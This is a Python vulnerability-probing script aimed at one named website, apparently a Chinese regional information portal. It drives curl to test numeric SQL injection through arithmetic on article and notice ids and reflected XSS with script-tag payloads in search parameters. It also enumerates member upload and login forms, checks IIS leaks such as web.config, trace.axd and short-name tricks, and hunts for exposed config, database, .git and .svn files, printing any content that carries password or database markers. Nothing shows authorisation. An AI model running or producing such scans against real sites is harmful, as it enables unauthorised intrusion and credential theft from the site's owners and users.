import subprocess
import time

TARGET = "https://www.malaqin.cn"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

def curl_get(path, timeout=12):
    url = TARGET + path
    cmd = ["curl", "-s", "-k", "-A", UA, "--compressed", "--max-time", str(timeout),
           "-H", "Accept: text/html,*/*",
           "-H", "Accept-Language: zh-CN,zh;q=0.9",
           url]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout+5)
        return result.stdout if result.stdout else ""
    except:
        return ""

def curl_get_raw(path, timeout=12):
    url = TARGET + path
    cmd = ["curl", "-s", "-i", "-k", "-A", UA, "--compressed", "--max-time", str(timeout), url]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout+5)
        return result.stdout if result.stdout else ""
    except:
        return ""

def main():
    print("=" * 70)
    print("  玛拉沁信息网 - 深度漏洞验证")
    print("=" * 70)

    # ============================================================
    print("\n[1] robots.txt 内容")
    print("-" * 60)
    body = curl_get("/robots.txt")
    print(body[:500] if body else "  无内容")

    # ============================================================
    print("\n[2] /api/ 内容分析")
    print("-" * 60)
    body = curl_get("/api/")
    if body:
        # 搜索API端点
        import re
        apis = re.findall(r'href=["\']([^"\']+)["\']', body)
        print(f"  /api/ 页面大小: {len(body)}B")
        if apis:
            print(f"  发现链接: {apis[:10]}")
        # 打印前500字符
        print(f"  内容预览: {body[:500]}")

    # ============================================================
    print("\n[3] 数值型SQL注入 (不带引号)")
    print("-" * 60)
    
    # notice 模块 - 尝试不带引号的注入
    notice_tests = [
        ("/notice/notice_376.html", "基线 376"),
        ("/notice/notice_377.html", "正常 377"),
        ("/notice/notice_375.html", "正常 375"),
        ("/notice/notice_0.html", "ID=0"),
        ("/notice/notice_99999.html", "不存在ID"),
        ("/notice/notice_376-0.html", "376-0 (数学运算)"),
        ("/notice/notice_375-0.html", "375-0=375"),
        ("/notice/notice_376-1.html", "376-1=375"),
    ]
    
    for path, label in notice_tests:
        body = curl_get(path)
        blen = len(body)
        print(f"  [{blen:6d}B]  {label}")
        time.sleep(0.2)
    
    # ============================================================
    print("\n[4] article 模块 - 数值运算注入")
    print("-" * 60)
    
    article_tests = [
        ("/article/article_16332.html", "基线 16332"),
        ("/article/article_16331.html", "正常 16331"),
        ("/article/article_16333.html", "正常 16333"),
        ("/article/article_16332-0.html", "16332-0=16332"),
        ("/article/article_16333-1.html", "16333-1=16332"),
        ("/article/article_16331+1.html", "16331+1=16332"),
    ]
    
    for path, label in article_tests:
        body = curl_get(path)
        blen = len(body)
        # 检查是否与基线相同
        if "16332-0" in label or "16333-1" in label or "16331+1" in label:
            if blen > 50000:
                print(f"  !! [{blen:6d}B]  {label} - 与基线大小接近, 可能存在数值型注入!")
            else:
                print(f"     [{blen:6d}B]  {label}")
        else:
            print(f"     [{blen:6d}B]  {label}")
        time.sleep(0.2)

    # ============================================================
    print("\n[5] XSS - 搜索/留言/评论功能")
    print("-" * 60)
    
    # 搜索功能
    search_tests = [
        ("/index.php?m=search&kw=<script>alert(1)</script>", "搜索 XSS script标签"),
        ("/search?kw=<script>alert(1)</script>", "search路径 XSS"),
        ("/search.php?kw=<script>alert(1)</script>", "search.php XSS"),
        ("/?m=search&kw=test_xss_marker_123", "搜索标记测试"),
        ("/info/?kw=test_xss_marker_123", "info搜索标记"),
        ("/info/search.php?kw=test_xss_marker_123", "info/search.php标记"),
    ]
    
    for path, label in search_tests:
        body = curl_get(path)
        if body:
            blen = len(body)
            if "test_xss_marker_123" in body or "alert(1)" in body or "<script>" in body:
                print(f"  !! [{blen}B]  {label} - XSS payload被反射!")
                # 找到上下文
                for marker in ["test_xss_marker_123", "alert(1)", "<script>"]:
                    if marker in body:
                        idx = body.find(marker)
                        context = body[max(0,idx-50):idx+80]
                        print(f"         上下文: ...{context}...")
            else:
                print(f"     [{blen}B]  {label}")
        else:
            print(f"     [0B]  {label}")
        time.sleep(0.3)

    # ============================================================
    print("\n[6] 会员中心 - 文件上传/信息发布")
    print("-" * 60)
    
    member_paths = [
        "/member/",
        "/memberinfo/",
        "/memberinfo/InfoPublish",
        "/memberarticle/",
        "/memberarticle/publisharticle",
        "/member/login",
        "/member/register",
    ]
    
    for path in member_paths:
        body = curl_get(path)
        if body:
            blen = len(body)
            # 检查上传表单
            has_upload = "enctype" in body.lower() and "file" in body.lower()
            has_form = "<form" in body.lower()
            has_login = "login" in body.lower() or "登录" in body or "登陆" in body
            has_register = "register" in body.lower() or "注册" in body
            has_upload_field = "type=\"file\"" in body or "type='file'" in body or "input.*file" in body.lower()
            
            flags = []
            if has_upload: flags.append("上传表单")
            if has_form: flags.append("表单")
            if has_login: flags.append("登录")
            if has_register: flags.append("注册")
            if has_upload_field: flags.append("文件输入框")
            
            print(f"  [{blen:6d}B]  {path}  {' | '.join(flags) if flags else ''}")
            
            # 提取表单action
            import re
            forms = re.findall(r'<form[^>]*action=["\']([^"\']+)["\'][^>]*>', body, re.I)
            if forms:
                print(f"         表单action: {forms}")
        time.sleep(0.3)

    # ============================================================
    print("\n[7] IIS 特有漏洞检测")
    print("-" * 60)
    
    iis_tests = [
        ("/index.aspx", "ASPX页面"),
        ("/web.config", "web.config泄露"),
        ("/web.config.bak", "web.config备份"),
        ("/web.config~", "web.config短文件名"),
        ("/web.confi~1", "8.3短文件名"),
        ("/web.config%00", "空字节截断"),
        ("/aspnet_client/", "aspnet_client目录"),
        ("/trace.axd", "ASP.NET跟踪"),
        ("/elmah.axd", "ELMAH错误日志"),
        ("/App_Data/", "App_Data目录"),
        ("/bin/", "bin目录"),
        ("/App_Code/", "App_Code目录"),
    ]
    
    # 404基线
    body_404 = curl_get("/nonexistent_xyz_999")
    size_404 = len(body_404)
    print(f"  404基线: {size_404}B")
    
    for path, label in iis_tests:
        body = curl_get(path)
        blen = len(body)
        if blen > 0 and abs(blen - size_404) > 50:
            print(f"  !! [{blen}B]  {label} - {path}")
            if blen < 1000:
                print(f"         内容: {body[:300]}")
        time.sleep(0.15)

    # ============================================================
    print("\n[8] 目录列表/配置文件")
    print("-" * 60)
    
    config_tests = [
        "/template/wap/main/default/config.php",
        "/template/config.php",
        "/template/wap/main/default/db.php",
        "/include/config.php",
        "/include/db.php",
        "/include/conn.php",
        "/common/config.php",
        "/common/db.php",
        "/core/config.php",
        "/data/config.php",
        "/data/db.php",
        "/config/config.php",
        "/config/database.php",
        "/config/db.php",
        "/conn.php",
        "/db.php",
        "/database.php",
        "/config.inc.php",
        "/config.php.bak",
        "/config.php~",
        "/config.php.old",
        "/.svn/entries",
        "/.git/HEAD",
        "/.git/config",
        "/crossdomain.xml",
        "/Web.config",
        "/Web.Config",
        "/WEB.CONFIG",
    ]
    
    for path in config_tests:
        body = curl_get(path)
        blen = len(body)
        if blen > 0 and abs(blen - size_404) > 100:
            print(f"  !! [{blen}B]  {path}")
            # 检查是否是配置文件内容
            config_markers = ["<?php", "mysql", "password", "DB_", "database", "host", "conn"]
            found = [m for m in config_markers if m.lower() in body.lower()]
            if found:
                print(f"         配置标记: {found}")
                print(f"         内容: {body[:300]}")
        time.sleep(0.15)

    print("\n验证完成。")

if __name__ == "__main__":
    main()
